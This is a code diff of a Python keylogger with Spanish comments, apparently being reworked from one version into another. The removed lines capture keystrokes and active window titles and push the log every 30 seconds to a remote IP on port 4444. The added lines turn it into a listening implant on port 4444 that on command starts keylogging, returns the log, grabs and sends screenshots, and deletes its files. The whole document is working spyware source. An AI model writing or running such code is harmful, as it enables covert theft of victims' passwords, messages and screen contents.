@@ -1,49 +1,89 @@
-from pynput import keyboard
 import socket
 import threading
-import datetime
 import os
 import time
+import datetime
+from pynput import keyboard
+from PIL import ImageGrab
 
-SERVER_IP = 'TU_IP_AQUÍ'  # <- aquí va la IP de tu PC
-SERVER_PORT = 4444
-SEND_INTERVAL = 30  # segundos
+HOST = "0.0.0.0"
+PORT = 4444
 LOG_FILE = "keylog.txt"
+SCREENSHOT_FILE = "screenshot.png"
 
+keylog_active = False
 log = []
 
-def send_log():
-    while True:
-        time.sleep(SEND_INTERVAL)
-        if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
-            try:
-                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                    s.connect((SERVER_IP, SERVER_PORT))
-                    with open(LOG_FILE, "rb") as f:
-                        data = f.read()
-                        s.sendall(data)
-                    open(LOG_FILE, "w").close()  # limpia el log después de enviar
-            except Exception as e:
-                print("Error enviando log:", e)
-
-def on_press(key):
+def save_log(key):
+    global keylog_active
+    if not keylog_active:
+        return
     try:
-        ventana = os.popen('xdotool getactivewindow getwindowname').read().strip()
+        with open(LOG_FILE, "a") as f:
+            f.write(f"[{datetime.datetime.now()}] {key}\n")
     except:
-        ventana = "unknown"
-    
-    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        pass
+
+def start_keylogger():
+    global keylog_active
+    keylog_active = True
+
+    def on_press(key):
+        try:
+            save_log(key.char)
+        except AttributeError:
+            save_log(str(key))
+
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()
+
+def get_log():
+    if os.path.exists(LOG_FILE):
+        with open(LOG_FILE, "r") as f:
+            return f.read()
+    return "[Log vacío]"
+
+def take_screenshot():
+    img = ImageGrab.grab()
+    img.save(SCREENSHOT_FILE)
+    with open(SCREENSHOT_FILE, "rb") as f:
+        return f.read()
+
+def delete_all():
     try:
-        log_entry = f"[{now}][{ventana}] {key.char}\n"
-    except AttributeError:
-        log_entry = f"[{now}][{ventana}] {key}\n"
-    
-    with open(LOG_FILE, "a") as f:
-        f.write(log_entry)
+        os.remove(LOG_FILE)
+        os.remove(SCREENSHOT_FILE)
+        return "[Archivos eliminados]"
+    except:
+        return "[Nada que borrar]"
 
-# Iniciar thread de envío
-threading.Thread(target=send_log, daemon=True).start()
+def handle_client(conn):
+    with conn:
+        data = conn.recv(1024).decode()
+        if data == "PING":
+            conn.sendall(b"OK")
+        elif data == "START":
+            start_keylogger()
+            conn.sendall(b"Keylogger iniciado")
+        elif data == "GET_LOG":
+            conn.sendall(get_log().encode())
+        elif data == "GET_IMAGE":
+            img_data = take_screenshot()
+            conn.sendall(img_data)
+        elif data == "DELETE_ALL":
+            response = delete_all()
+            conn.sendall(response.encode())
+        else:
+            conn.sendall(b"Comando desconocido")
 
-# Listener
-with keyboard.Listener(on_press=on_press) as listener:
-    listener.join()
+def server_loop():
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.bind((HOST, PORT))
+        s.listen()
+        print(f"[+] Esperando comandos en {HOST}:{PORT}...")
+        while True:
+            conn, addr = s.accept()
+            threading.Thread(target=handle_client, args=(conn,), daemon=True).start()
+
+if __name__ == "__main__":
+    server_loop()
